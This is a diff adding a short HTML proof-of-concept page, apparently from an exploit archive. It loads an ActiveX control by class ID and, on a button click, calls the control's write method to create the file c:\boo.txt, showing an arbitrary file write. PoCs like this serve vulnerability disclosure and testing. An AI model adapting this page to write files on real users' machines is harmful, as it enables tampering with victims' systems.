@@ -1,0 +1,16 @@
+&lt;HTML&gt;
+&lt;BODY&gt;
+  &lt;object id=target classid=&quot;clsid:{9A077D0D-B4A6-4EC0-B6CF-98526DF589E4}&quot;&gt;&lt;/object&gt;
+
+&lt;SCRIPT&gt;
+
+function Poc()
+ {
+    arg1=&quot;c:\boo.txt&quot;
+    target.write(arg1)
+ }
+
+&lt;/SCRIPT&gt;
+&lt;input language=JavaScript onclick=Poc() type=button value=&quot;Proof of Concept&quot;&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;
